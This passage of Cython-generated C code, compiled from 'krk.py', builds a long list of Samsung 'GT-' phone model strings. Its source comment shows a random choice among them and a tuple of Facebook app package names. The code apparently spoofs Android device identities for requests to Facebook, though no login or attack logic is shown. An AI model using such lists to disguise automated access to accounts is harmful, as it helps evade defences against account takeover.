  PyList_SET_ITEM(__pyx_t_3, 275, __pyx_kp_s_GT_S5690);
  __Pyx_INCREF(__pyx_kp_s_GT_S5690R);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5690R);
  PyList_SET_ITEM(__pyx_t_3, 276, __pyx_kp_s_GT_S5690R);
  __Pyx_INCREF(__pyx_kp_s_GT_S5830);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5830);
  PyList_SET_ITEM(__pyx_t_3, 277, __pyx_kp_s_GT_S5830);
  __Pyx_INCREF(__pyx_kp_s_GT_S5830D);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5830D);
  PyList_SET_ITEM(__pyx_t_3, 278, __pyx_kp_s_GT_S5830D);
  __Pyx_INCREF(__pyx_kp_s_GT_S5830G);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5830G);
  PyList_SET_ITEM(__pyx_t_3, 279, __pyx_kp_s_GT_S5830G);
  __Pyx_INCREF(__pyx_kp_s_GT_S5830i);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5830i);
  PyList_SET_ITEM(__pyx_t_3, 280, __pyx_kp_s_GT_S5830i);
  __Pyx_INCREF(__pyx_kp_s_GT_S5830L);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5830L);
  PyList_SET_ITEM(__pyx_t_3, 281, __pyx_kp_s_GT_S5830L);
  __Pyx_INCREF(__pyx_kp_s_GT_S5830M);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5830M);
  PyList_SET_ITEM(__pyx_t_3, 282, __pyx_kp_s_GT_S5830M);
  __Pyx_INCREF(__pyx_kp_s_GT_S5830T);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5830T);
  PyList_SET_ITEM(__pyx_t_3, 283, __pyx_kp_s_GT_S5830T);
  __Pyx_INCREF(__pyx_kp_s_GT_S5830V);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5830V);
  PyList_SET_ITEM(__pyx_t_3, 284, __pyx_kp_s_GT_S5830V);
  __Pyx_INCREF(__pyx_kp_s_GT_S5831i);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5831i);
  PyList_SET_ITEM(__pyx_t_3, 285, __pyx_kp_s_GT_S5831i);
  __Pyx_INCREF(__pyx_kp_s_GT_S5838);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5838);
  PyList_SET_ITEM(__pyx_t_3, 286, __pyx_kp_s_GT_S5838);
  __Pyx_INCREF(__pyx_kp_s_GT_S5839i);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5839i);
  PyList_SET_ITEM(__pyx_t_3, 287, __pyx_kp_s_GT_S5839i);
  __Pyx_INCREF(__pyx_kp_s_GT_S6010);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6010);
  PyList_SET_ITEM(__pyx_t_3, 288, __pyx_kp_s_GT_S6010);
  __Pyx_INCREF(__pyx_kp_s_GT_S6010BBABTU);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6010BBABTU);
  PyList_SET_ITEM(__pyx_t_3, 289, __pyx_kp_s_GT_S6010BBABTU);
  __Pyx_INCREF(__pyx_kp_s_GT_S6012);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6012);
  PyList_SET_ITEM(__pyx_t_3, 290, __pyx_kp_s_GT_S6012);
  __Pyx_INCREF(__pyx_kp_s_GT_S6012B);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6012B);
  PyList_SET_ITEM(__pyx_t_3, 291, __pyx_kp_s_GT_S6012B);
  __Pyx_INCREF(__pyx_kp_s_GT_S6102);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6102);
  PyList_SET_ITEM(__pyx_t_3, 292, __pyx_kp_s_GT_S6102);
  __Pyx_INCREF(__pyx_kp_s_GT_S6102B);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6102B);
  PyList_SET_ITEM(__pyx_t_3, 293, __pyx_kp_s_GT_S6102B);
  __Pyx_INCREF(__pyx_kp_s_GT_S6293T);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6293T);
  PyList_SET_ITEM(__pyx_t_3, 294, __pyx_kp_s_GT_S6293T);
  __Pyx_INCREF(__pyx_kp_s_GT_S6310B);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6310B);
  PyList_SET_ITEM(__pyx_t_3, 295, __pyx_kp_s_GT_S6310B);
  __Pyx_INCREF(__pyx_kp_s_GT_S6310ZWAMID);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6310ZWAMID);
  PyList_SET_ITEM(__pyx_t_3, 296, __pyx_kp_s_GT_S6310ZWAMID);
  __Pyx_INCREF(__pyx_kp_s_GT_S6312);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6312);
  PyList_SET_ITEM(__pyx_t_3, 297, __pyx_kp_s_GT_S6312);
  __Pyx_INCREF(__pyx_kp_s_GT_S6313T);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6313T);
  PyList_SET_ITEM(__pyx_t_3, 298, __pyx_kp_s_GT_S6313T);
  __Pyx_INCREF(__pyx_kp_s_GT_S6352);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6352);
  PyList_SET_ITEM(__pyx_t_3, 299, __pyx_kp_s_GT_S6352);
  __Pyx_INCREF(__pyx_kp_s_GT_S6500);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6500);
  PyList_SET_ITEM(__pyx_t_3, 300, __pyx_kp_s_GT_S6500);
  __Pyx_INCREF(__pyx_kp_s_GT_S6500D);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6500D);
  PyList_SET_ITEM(__pyx_t_3, 301, __pyx_kp_s_GT_S6500D);
  __Pyx_INCREF(__pyx_kp_s_GT_S6500L);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6500L);
  PyList_SET_ITEM(__pyx_t_3, 302, __pyx_kp_s_GT_S6500L);
  __Pyx_INCREF(__pyx_kp_s_GT_S6790);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6790);
  PyList_SET_ITEM(__pyx_t_3, 303, __pyx_kp_s_GT_S6790);
  __Pyx_INCREF(__pyx_kp_s_GT_S6790L);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6790L);
  PyList_SET_ITEM(__pyx_t_3, 304, __pyx_kp_s_GT_S6790L);
  __Pyx_INCREF(__pyx_kp_s_GT_S6790N);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6790N);
  PyList_SET_ITEM(__pyx_t_3, 305, __pyx_kp_s_GT_S6790N);
  __Pyx_INCREF(__pyx_kp_s_GT_S6792L);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6792L);
  PyList_SET_ITEM(__pyx_t_3, 306, __pyx_kp_s_GT_S6792L);
  __Pyx_INCREF(__pyx_kp_s_GT_S6800);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6800);
  PyList_SET_ITEM(__pyx_t_3, 307, __pyx_kp_s_GT_S6800);
  __Pyx_INCREF(__pyx_kp_s_GT_S6800HKAXFA);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6800HKAXFA);
  PyList_SET_ITEM(__pyx_t_3, 308, __pyx_kp_s_GT_S6800HKAXFA);
  __Pyx_INCREF(__pyx_kp_s_GT_S6802);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6802);
  PyList_SET_ITEM(__pyx_t_3, 309, __pyx_kp_s_GT_S6802);
  __Pyx_INCREF(__pyx_kp_s_GT_S6810);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6810);
  PyList_SET_ITEM(__pyx_t_3, 310, __pyx_kp_s_GT_S6810);
  __Pyx_INCREF(__pyx_kp_s_GT_S6810B);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6810B);
  PyList_SET_ITEM(__pyx_t_3, 311, __pyx_kp_s_GT_S6810B);
  __Pyx_INCREF(__pyx_kp_s_GT_S6810E);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6810E);
  PyList_SET_ITEM(__pyx_t_3, 312, __pyx_kp_s_GT_S6810E);
  __Pyx_INCREF(__pyx_kp_s_GT_S6810L);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6810L);
  PyList_SET_ITEM(__pyx_t_3, 313, __pyx_kp_s_GT_S6810L);
  __Pyx_INCREF(__pyx_kp_s_GT_S6810M);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6810M);
  PyList_SET_ITEM(__pyx_t_3, 314, __pyx_kp_s_GT_S6810M);
  __Pyx_INCREF(__pyx_kp_s_GT_S6810MBASER);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6810MBASER);
  PyList_SET_ITEM(__pyx_t_3, 315, __pyx_kp_s_GT_S6810MBASER);
  __Pyx_INCREF(__pyx_kp_s_GT_S6810P);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6810P);
  PyList_SET_ITEM(__pyx_t_3, 316, __pyx_kp_s_GT_S6810P);
  __Pyx_INCREF(__pyx_kp_s_GT_S6812);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6812);
  PyList_SET_ITEM(__pyx_t_3, 317, __pyx_kp_s_GT_S6812);
  __Pyx_INCREF(__pyx_kp_s_GT_S6812B);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6812B);
  PyList_SET_ITEM(__pyx_t_3, 318, __pyx_kp_s_GT_S6812B);
  __Pyx_INCREF(__pyx_kp_s_GT_S6812C);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6812C);
  PyList_SET_ITEM(__pyx_t_3, 319, __pyx_kp_s_GT_S6812C);
  __Pyx_INCREF(__pyx_kp_s_GT_S6812i);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6812i);
  PyList_SET_ITEM(__pyx_t_3, 320, __pyx_kp_s_GT_S6812i);
  __Pyx_INCREF(__pyx_kp_s_GT_S6818);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6818);
  PyList_SET_ITEM(__pyx_t_3, 321, __pyx_kp_s_GT_S6818);
  __Pyx_INCREF(__pyx_kp_s_GT_S6818V);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S6818V);
  PyList_SET_ITEM(__pyx_t_3, 322, __pyx_kp_s_GT_S6818V);
  __Pyx_INCREF(__pyx_kp_s_GT_S7230E);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7230E);
  PyList_SET_ITEM(__pyx_t_3, 323, __pyx_kp_s_GT_S7230E);
  __Pyx_INCREF(__pyx_kp_s_GT_S7233E);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7233E);
  PyList_SET_ITEM(__pyx_t_3, 324, __pyx_kp_s_GT_S7233E);
  __Pyx_INCREF(__pyx_kp_s_GT_S7250D);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7250D);
  PyList_SET_ITEM(__pyx_t_3, 325, __pyx_kp_s_GT_S7250D);
  __Pyx_INCREF(__pyx_kp_s_GT_S7262);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7262);
  PyList_SET_ITEM(__pyx_t_3, 326, __pyx_kp_s_GT_S7262);
  __Pyx_INCREF(__pyx_kp_s_GT_S7270);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7270);
  PyList_SET_ITEM(__pyx_t_3, 327, __pyx_kp_s_GT_S7270);
  __Pyx_INCREF(__pyx_kp_s_GT_S7270L);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7270L);
  PyList_SET_ITEM(__pyx_t_3, 328, __pyx_kp_s_GT_S7270L);
  __Pyx_INCREF(__pyx_kp_s_GT_S7272);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7272);
  PyList_SET_ITEM(__pyx_t_3, 329, __pyx_kp_s_GT_S7272);
  __Pyx_INCREF(__pyx_kp_s_GT_S7272C);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7272C);
  PyList_SET_ITEM(__pyx_t_3, 330, __pyx_kp_s_GT_S7272C);
  __Pyx_INCREF(__pyx_kp_s_GT_S7273T);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7273T);
  PyList_SET_ITEM(__pyx_t_3, 331, __pyx_kp_s_GT_S7273T);
  __Pyx_INCREF(__pyx_kp_s_GT_S7278);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7278);
  PyList_SET_ITEM(__pyx_t_3, 332, __pyx_kp_s_GT_S7278);
  __Pyx_INCREF(__pyx_kp_s_GT_S7278U);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7278U);
  PyList_SET_ITEM(__pyx_t_3, 333, __pyx_kp_s_GT_S7278U);
  __Pyx_INCREF(__pyx_kp_s_GT_S7390);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7390);
  PyList_SET_ITEM(__pyx_t_3, 334, __pyx_kp_s_GT_S7390);
  __Pyx_INCREF(__pyx_kp_s_GT_S7390G);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7390G);
  PyList_SET_ITEM(__pyx_t_3, 335, __pyx_kp_s_GT_S7390G);
  __Pyx_INCREF(__pyx_kp_s_GT_S7390L);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7390L);
  PyList_SET_ITEM(__pyx_t_3, 336, __pyx_kp_s_GT_S7390L);
  __Pyx_INCREF(__pyx_kp_s_GT_S7392);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7392);
  PyList_SET_ITEM(__pyx_t_3, 337, __pyx_kp_s_GT_S7392);
  __Pyx_INCREF(__pyx_kp_s_GT_S7392L);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7392L);
  PyList_SET_ITEM(__pyx_t_3, 338, __pyx_kp_s_GT_S7392L);
  __Pyx_INCREF(__pyx_kp_s_GT_S7500);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7500);
  PyList_SET_ITEM(__pyx_t_3, 339, __pyx_kp_s_GT_S7500);
  __Pyx_INCREF(__pyx_kp_s_GT_S7500ABABTU);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7500ABABTU);
  PyList_SET_ITEM(__pyx_t_3, 340, __pyx_kp_s_GT_S7500ABABTU);
  __Pyx_INCREF(__pyx_kp_s_GT_S7500ABADBT);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7500ABADBT);
  PyList_SET_ITEM(__pyx_t_3, 341, __pyx_kp_s_GT_S7500ABADBT);
  __Pyx_INCREF(__pyx_kp_s_GT_S7500ABTTLP);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7500ABTTLP);
  PyList_SET_ITEM(__pyx_t_3, 342, __pyx_kp_s_GT_S7500ABTTLP);
  __Pyx_INCREF(__pyx_kp_s_GT_S7500CWADBT);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7500CWADBT);
  PyList_SET_ITEM(__pyx_t_3, 343, __pyx_kp_s_GT_S7500CWADBT);
  __Pyx_INCREF(__pyx_kp_s_GT_S7500L);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7500L);
  PyList_SET_ITEM(__pyx_t_3, 344, __pyx_kp_s_GT_S7500L);
  __Pyx_INCREF(__pyx_kp_s_GT_S7500T);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7500T);
  PyList_SET_ITEM(__pyx_t_3, 345, __pyx_kp_s_GT_S7500T);
  __Pyx_INCREF(__pyx_kp_s_GT_S7560);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7560);
  PyList_SET_ITEM(__pyx_t_3, 346, __pyx_kp_s_GT_S7560);
  __Pyx_INCREF(__pyx_kp_s_GT_S7560M);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7560M);
  PyList_SET_ITEM(__pyx_t_3, 347, __pyx_kp_s_GT_S7560M);
  __Pyx_INCREF(__pyx_kp_s_GT_S7562);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7562);
  PyList_SET_ITEM(__pyx_t_3, 348, __pyx_kp_s_GT_S7562);
  __Pyx_INCREF(__pyx_kp_s_GT_S7562C);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7562C);
  PyList_SET_ITEM(__pyx_t_3, 349, __pyx_kp_s_GT_S7562C);
  __Pyx_INCREF(__pyx_kp_s_GT_S7562i);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7562i);
  PyList_SET_ITEM(__pyx_t_3, 350, __pyx_kp_s_GT_S7562i);
  __Pyx_INCREF(__pyx_kp_s_GT_S7562L);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7562L);
  PyList_SET_ITEM(__pyx_t_3, 351, __pyx_kp_s_GT_S7562L);
  __Pyx_INCREF(__pyx_kp_s_GT_S7566);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7566);
  PyList_SET_ITEM(__pyx_t_3, 352, __pyx_kp_s_GT_S7566);
  __Pyx_INCREF(__pyx_kp_s_GT_S7568);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7568);
  PyList_SET_ITEM(__pyx_t_3, 353, __pyx_kp_s_GT_S7568);
  __Pyx_INCREF(__pyx_kp_s_GT_S7568I);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7568I);
  PyList_SET_ITEM(__pyx_t_3, 354, __pyx_kp_s_GT_S7568I);
  __Pyx_INCREF(__pyx_kp_s_GT_S7572);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7572);
  PyList_SET_ITEM(__pyx_t_3, 355, __pyx_kp_s_GT_S7572);
  __Pyx_INCREF(__pyx_kp_s_GT_S7580E);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7580E);
  PyList_SET_ITEM(__pyx_t_3, 356, __pyx_kp_s_GT_S7580E);
  __Pyx_INCREF(__pyx_kp_s_GT_S7583T);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7583T);
  PyList_SET_ITEM(__pyx_t_3, 357, __pyx_kp_s_GT_S7583T);
  __Pyx_INCREF(__pyx_kp_s_GT_S758X);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S758X);
  PyList_SET_ITEM(__pyx_t_3, 358, __pyx_kp_s_GT_S758X);
  __Pyx_INCREF(__pyx_kp_s_GT_S7592);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7592);
  PyList_SET_ITEM(__pyx_t_3, 359, __pyx_kp_s_GT_S7592);
  __Pyx_INCREF(__pyx_kp_s_GT_S7710);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7710);
  PyList_SET_ITEM(__pyx_t_3, 360, __pyx_kp_s_GT_S7710);
  __Pyx_INCREF(__pyx_kp_s_GT_S7710L);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7710L);
  PyList_SET_ITEM(__pyx_t_3, 361, __pyx_kp_s_GT_S7710L);
  __Pyx_INCREF(__pyx_kp_s_GT_S7898);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7898);
  PyList_SET_ITEM(__pyx_t_3, 362, __pyx_kp_s_GT_S7898);
  __Pyx_INCREF(__pyx_kp_s_GT_S7898I);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7898I);
  PyList_SET_ITEM(__pyx_t_3, 363, __pyx_kp_s_GT_S7898I);
  __Pyx_INCREF(__pyx_kp_s_GT_S8500);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S8500);
  PyList_SET_ITEM(__pyx_t_3, 364, __pyx_kp_s_GT_S8500);
  __Pyx_INCREF(__pyx_kp_s_GT_S8530);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S8530);
  PyList_SET_ITEM(__pyx_t_3, 365, __pyx_kp_s_GT_S8530);
  __Pyx_INCREF(__pyx_kp_s_GT_S8600);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S8600);
  PyList_SET_ITEM(__pyx_t_3, 366, __pyx_kp_s_GT_S8600);
  __Pyx_INCREF(__pyx_kp_s_GT_STB919);
  __Pyx_GIVEREF(__pyx_kp_s_GT_STB919);
  PyList_SET_ITEM(__pyx_t_3, 367, __pyx_kp_s_GT_STB919);
  __Pyx_INCREF(__pyx_kp_s_GT_T140);
  __Pyx_GIVEREF(__pyx_kp_s_GT_T140);
  PyList_SET_ITEM(__pyx_t_3, 368, __pyx_kp_s_GT_T140);
  __Pyx_INCREF(__pyx_kp_s_GT_T150);
  __Pyx_GIVEREF(__pyx_kp_s_GT_T150);
  PyList_SET_ITEM(__pyx_t_3, 369, __pyx_kp_s_GT_T150);
  __Pyx_INCREF(__pyx_kp_s_GT_V8a);
  __Pyx_GIVEREF(__pyx_kp_s_GT_V8a);
  PyList_SET_ITEM(__pyx_t_3, 370, __pyx_kp_s_GT_V8a);
  __Pyx_INCREF(__pyx_kp_s_GT_V8i);
  __Pyx_GIVEREF(__pyx_kp_s_GT_V8i);
  PyList_SET_ITEM(__pyx_t_3, 371, __pyx_kp_s_GT_V8i);
  __Pyx_INCREF(__pyx_kp_s_GT_VC818);
  __Pyx_GIVEREF(__pyx_kp_s_GT_VC818);
  PyList_SET_ITEM(__pyx_t_3, 372, __pyx_kp_s_GT_VC818);
  __Pyx_INCREF(__pyx_kp_s_GT_VM919S);
  __Pyx_GIVEREF(__pyx_kp_s_GT_VM919S);
  PyList_SET_ITEM(__pyx_t_3, 373, __pyx_kp_s_GT_VM919S);
  __Pyx_INCREF(__pyx_kp_s_GT_W131);
  __Pyx_GIVEREF(__pyx_kp_s_GT_W131);
  PyList_SET_ITEM(__pyx_t_3, 374, __pyx_kp_s_GT_W131);
  __Pyx_INCREF(__pyx_kp_s_GT_W153);
  __Pyx_GIVEREF(__pyx_kp_s_GT_W153);
  PyList_SET_ITEM(__pyx_t_3, 375, __pyx_kp_s_GT_W153);
  __Pyx_INCREF(__pyx_kp_s_GT_X831);
  __Pyx_GIVEREF(__pyx_kp_s_GT_X831);
  PyList_SET_ITEM(__pyx_t_3, 376, __pyx_kp_s_GT_X831);
  __Pyx_INCREF(__pyx_kp_s_GT_X853);
  __Pyx_GIVEREF(__pyx_kp_s_GT_X853);
  PyList_SET_ITEM(__pyx_t_3, 377, __pyx_kp_s_GT_X853);
  __Pyx_INCREF(__pyx_kp_s_GT_X870);
  __Pyx_GIVEREF(__pyx_kp_s_GT_X870);
  PyList_SET_ITEM(__pyx_t_3, 378, __pyx_kp_s_GT_X870);
  __Pyx_INCREF(__pyx_kp_s_GT_X890);
  __Pyx_GIVEREF(__pyx_kp_s_GT_X890);
  PyList_SET_ITEM(__pyx_t_3, 379, __pyx_kp_s_GT_X890);
  __Pyx_INCREF(__pyx_kp_s_GT_Y8750);
  __Pyx_GIVEREF(__pyx_kp_s_GT_Y8750);
  PyList_SET_ITEM(__pyx_t_3, 380, __pyx_kp_s_GT_Y8750);
  __pyx_t_6 = __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_gt, __pyx_t_6) < 0) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  /* "krk.py":18
 * fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
 * gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
